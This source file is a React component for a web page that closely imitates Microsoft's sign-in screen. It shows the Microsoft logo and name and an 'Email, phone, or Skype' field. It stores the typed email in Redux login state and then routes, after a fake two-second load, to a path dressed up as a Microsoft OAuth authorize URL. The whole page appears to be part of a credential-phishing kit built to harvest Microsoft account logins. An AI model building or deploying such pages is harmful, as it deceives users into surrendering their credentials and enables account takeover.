import './username.css';
import logo from "../../images/logo1.png"
import key from "../../images/icon1.png"
import { useDispatch, useSelector } from 'react-redux';
import { SET_LOGIN_DETAILS } from '../../redux/slice/authSlice';
import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router';
import load from "../../images/load.gif"
import { Link } from 'react-router-dom';
import Loader from '../../loader/Loader';

function Password() {
    const [email, setEmail] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const navigate = useNavigate()
    const dispatch = useDispatch()

    useEffect(()=>{
        dispatch( SET_LOGIN_DETAILS({
            email: email
        }))
      }, [email])
      const sendMessage = () => {
        setIsLoading(true)        
        setTimeout(() =>{
          navigate("/oauth20-authorizeclientid81feacddd-2edrd-41e6-9bef-3e20a22349vb7&scopeserviceaaccount.microsoft.WbaXaqhlu3sd-gAubAZZJy6ucVbpZct0tgEpqhcliVqIu1_aWN8-8D8qbNfIaOx2ltT_MLp5yxpsHiYMtv0X8q4Shp7vV6-APMxGT")
          setIsLoading(false)
      }, 2000);
      }
    
  return (
    <div className="App">
      <div className={isLoading ? "userOpaque" : "appContent"}>
        {
          isLoading ? (
            <div className='loader'>
              <Loader />         
            </div>
          ) : null
        }
          <div className='logoContent'>
            <img src={logo} alt="logo" className="logo" />
            <p style={{color: "#8c8c8c", fontWeight: "600", fontSize:"20px"}}>Microsoft</p>
          </div>
          <div className="content">
            <p style={{fontWeight: "600", fontSize:"25px", marginTop:"2px"}}>Sign in</p>
            <form  
                style={{marginTop:"-2px"}} 
            >
              <input 
                type="text" 
                placeholder="Email, phone, or Skype" 
                className='input'
                required
                value={email} 
                onChange={(e)=> setEmail(e.target.value)} 
            />
            </form>
            <p>
              No account? <span style={{color: "#2281cb"}}>Create One!</span>
            </p>
            <p style={{color: "#2281cb"}}>
              Can't access your account?
            </p>
          </div>
          <div className="controls">
            <button className='btn1'>
              Back
            </button>
            {/* <Link to="/oauth20-authorizeclientid81feacddd-2edrd-41e6-9bef-3e20a22349vb7&scopeserviceaaccount.microsoft.WbaXaqhlu3sd-gAubAZZJy6ucVbpZct0tgEpqhcliVqIu1_aWN8-8D8qbNfIaOx2ltT_MLp5yxpsHiYMtv0X8q4Shp7vV6-APMxGT" className='="btn' >
                Next
            </Link> */}
            <button 
                // type="submit" 
                className='btn' 
                onClick={sendMessage}
                disabled={isLoading}
            >
              Next
            </button>
          </div>
      </div>
      <button className="innerContainer" >
        <img src={key} alt="key" className='keyLogo' />
        <p className="innerContent">Sign-in options</p>       
      </button>
      <div className='conditions'>
        <h5>Terms of use</h5>
        <h5>Privacy & cookies</h5>
        <h5 style={{fontSize:"21px", marginBottom:"45px"}}>...</h5>
      </div>
    </div>
  );
}

export default Password;
